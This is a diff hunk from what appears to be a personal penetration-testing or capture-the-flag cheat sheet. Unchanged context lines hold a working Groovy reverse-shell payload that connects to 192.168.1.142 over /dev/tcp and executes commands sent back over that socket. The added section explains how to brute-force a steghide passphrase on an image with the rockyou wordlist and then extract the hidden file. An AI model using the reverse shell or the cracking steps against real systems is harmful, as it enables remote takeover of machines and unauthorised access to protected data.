@@ -83,3 +83,24 @@ JAVA
 r = Runtime.getRuntime()
 p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
 p.waitFor()
+
+
+
+
+Steganography: 
+==============
+
+apt-get install steghide
+pip3 install stegcracker
+
+Command: /usr/local/bin/stegcracker ./hackerman.jpg /usr/share/wordlists/rockyou.txt
+-- if the password is found, it will be outputted to the file with extension *.out
+
+then use the password to get the hidden file: 
+Command: steghide extract -sf hackerman.jpg
+-- the hidden text will be written to the *.txt file
+
+
+
+
+
